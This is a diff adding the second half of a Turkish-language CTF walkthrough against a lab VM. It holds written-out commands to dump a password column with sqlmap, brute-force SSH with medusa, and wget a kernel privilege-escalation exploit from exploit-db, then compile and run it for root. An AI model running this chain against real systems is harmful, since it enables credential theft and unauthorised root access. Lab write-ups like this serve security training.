@@ -110,4 +110,56 @@ username bilgilerini çektik şimdi password bilgilerini çekelim.
 
 <code>sqlmap -r burpresult.txt --dbms mysql --technique T -D Webapp -T Users -C password --dump </code>
 
+![21](https://user-images.githubusercontent.com/32979760/115159999-929d6e80-a09e-11eb-9f45-0d6a1eaf7c8c.PNG)
+
+bu çektiğimiz kullanıcı adı ve şifreleri bir text dosyasına yazıyoruz
+![22](https://user-images.githubusercontent.com/32979760/115160052-d98b6400-a09e-11eb-9f03-4bd0fe7f4c3a.PNG)
+![23](https://user-images.githubusercontent.com/32979760/115160053-da23fa80-a09e-11eb-98e5-cd5a4f84eb3e.PNG)
+
+Hangi kullanıcının ssh ile bağlanma yetkisi olup olmadığını bilmediğimiz için ssh servisine medua ile brut force denemesi yapacağız.
+<code>medusa -h 192.168.56.104 -U users -P passwords -M ssh </code>
+
+![24](https://user-images.githubusercontent.com/32979760/115160119-3a1aa100-a09f-11eb-8c9b-3f8abd14638d.PNG)
+Brute force atağımız sonuç verdi ve kullanıcı adı ve parolayı bulduk şimdi bu bilgilerle ssh bağlantısı yapıyoruz.
+
+<code>ssh smeagol@192.168.56.104 </code>
+
+buradan sonra bize parola soruluyor ve buraya </code>MyPreciousR00t</code> parolasını giriyoruz ve shelle düşüyoruz.Shelle düştükten sonra whoami yazıp kim olduğumuzu görüyoruz.
+
+![25](https://user-images.githubusercontent.com/32979760/115160219-c036e780-a09f-11eb-8ae2-27af12ec2a03.PNG)
+
+root olmadığımızı görüyoruz ve bu sistemde hak yükseltmek için exploit olup olmadığını araştırmamız gerekiyor.İlk olarak
+
+<code>uname -a </code>
+
+komutunu çalıştırıyoruz ve sistem bilgilerini, sürümünü görüyoruz.
+
+![26](https://user-images.githubusercontent.com/32979760/115160265-1146db80-a0a0-11eb-9ed2-0ab8b78122dd.PNG)
+
+Sistem bilgilerini google arama motoruna yazıp exploit araştırıyoruz.
+
+![27](https://user-images.githubusercontent.com/32979760/115160327-566b0d80-a0a0-11eb-9b1c-56b20cb80cab.PNG)
+
+Burada karşımıza 2 tane exploit çıkıyor bunun ilkini deniyoruz.
+
+<code>wget https://www.exploit-db.com/download/39166 </code>
+
+![28](https://user-images.githubusercontent.com/32979760/115160393-96ca8b80-a0a0-11eb-9a34-9113ee773e1d.PNG)
+
+Ardından aşağıdaki fotoğrafta gösterildiği gibi komutları sırasıyla girip C kodumuzu derleyip çalıştırıyoruz.
+
+![29](https://user-images.githubusercontent.com/32979760/115160459-e14c0800-a0a0-11eb-813a-8095214fa1cb.PNG)
+
+whoami yazdığımızda ise görüldüğü üzere root olduğumuzu görüyoruz.
+
+![30](https://user-images.githubusercontent.com/32979760/115160497-22441c80-a0a1-11eb-815d-f1079700c1aa.PNG)
+
+ve root dizinine gidip içerisindeki Flag.txtyi okuyup CTF'i burada sonlandırıyoruz.
+
+Okuduğunuz için teşekkürler.
+
+
+
+
+
 
